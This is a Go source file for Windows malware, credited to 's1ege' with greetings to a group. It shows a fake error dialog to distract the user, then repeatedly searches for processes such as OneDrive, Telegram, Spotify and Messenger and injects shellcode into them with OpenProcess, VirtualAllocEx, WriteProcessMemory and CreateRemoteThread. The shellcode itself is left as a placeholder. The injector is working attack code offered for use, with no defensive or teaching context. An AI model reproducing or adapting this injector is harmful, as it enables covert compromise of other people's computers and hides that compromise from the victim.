// coded by s1ege greetz to all GSH members..
package main

import (
    "syscall"
    "unsafe"
    "github.com/TheTitanrain/w32"
    "time"
)

var proc_list = map[interface{}]interface{} {
    // enter target processes here, the more the better..
    "OneDrive.exe": 0,
    "Telegram.exe": 0,
    "Spotify.exe": 0,
    "Messenger.exe": 0,
}
var targeted_pids []uint32


func messagebox() {
    user32 := syscall.MustLoadDLL("user32.dll")
    mbox := user32.MustFindProc("MessageBoxW")

    title := "Error:"
    message := "Error to distract user."
    mbox.Call(0,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
        0)
}

func getprocname(id uint32) string {
    snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
    var me w32.MODULEENTRY32
    me.Size = uint32(unsafe.Sizeof(me))
    if w32.Module32First(snapshot, &me) {
        return w32.UTF16PtrToString(&me.SzModule[0])
    }
    return ""
}

func check_pid(pid uint32) bool {
    // check if pid evaluates to true or if pid is in targeted_pids slice-
    // return false else return true
    for _,val := range targeted_pids {
        if pid == 0 || pid == val {
            return false
        }
    }
    return true
}

func get_pids() {
    size := uint32(1000)
    procs := make([]uint32, size)
    var bytesReturned uint32
    for {
        for proc,_ := range proc_list {
            if w32.EnumProcesses(procs, size, &bytesReturned) {
                for _, pid := range procs[:int(bytesReturned)/4] {
                    if getprocname(pid) == proc {
                        // if pid is valid set proc_list's corresponding key equal to pid
                        if check_pid(pid) {
                            proc_list[proc] = pid
                        }
                    } else {
                        // sleep 15 milliseconds to limit cpu usage
                        time.Sleep(15 * time.Millisecond)
                    }          
                }
            }
        }
    }
}

func clear_pids() {
    // decrease/increase time based on proc_list length
    for {
        time.Sleep(15 * time.Minute)
        targeted_pids = targeted_pids[:0]
    }
}

func inject(shellcode []byte, pid uint32) {
    MEM_COMMIT := uintptr(0x1000)
    PAGE_EXECUTE_READWRITE := uintptr(0x40)
    PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)

    // obtain necessary winapi functions from kernel32 for process injection
    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    openproc := kernel32.MustFindProc("OpenProcess")
    vallocex := kernel32.MustFindProc("VirtualAllocEx")
    writeprocmem := kernel32.MustFindProc("WriteProcessMemory")
    createremthread := kernel32.MustFindProc("CreateRemoteThread")
    closehandle := kernel32.MustFindProc("CloseHandle")

    // inject & execute shellcode in target process' space
    processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS, 
                                         0, 
                                         uintptr(pid))
    remote_buf, _, _ := vallocex.Call(processHandle,
                                      0,
                                      uintptr(len(shellcode)),
                                      MEM_COMMIT,
                                      PAGE_EXECUTE_READWRITE)
    writeprocmem.Call(processHandle,
                      remote_buf,
                      uintptr(unsafe.Pointer(&shellcode[0])),
                      uintptr(len(shellcode)),
                      0)
    createremthread.Call(processHandle,
                         0,
                         0,
                         remote_buf,
                         0,
                         0,
                         0)
    closehandle.Call(processHandle)
}

func main() {
    // enter shellcode here in 0x00 format
    shellcode := []byte{0x00, 0x00, 0x00}

    // thread to distract user with inauthentic error message
    go messagebox()

    // thread to scan for target pids
    go get_pids()

    // thread to clear targeted_pids slice to limit amount of memory used
    go clear_pids()

    // recursively iterate over proc_list's pids and filter out valid targets-
    // sleeps are to limit cpu usage
    for {
        time.Sleep(1 * time.Second)
        for _,val := range proc_list {
            pid, _ := val.(uint32)
            if check_pid(pid) {
                inject(shellcode, pid)
                targeted_pids = append(targeted_pids, pid)
            } else {
                time.Sleep(1 * time.Second)
            }
        }
    }
}
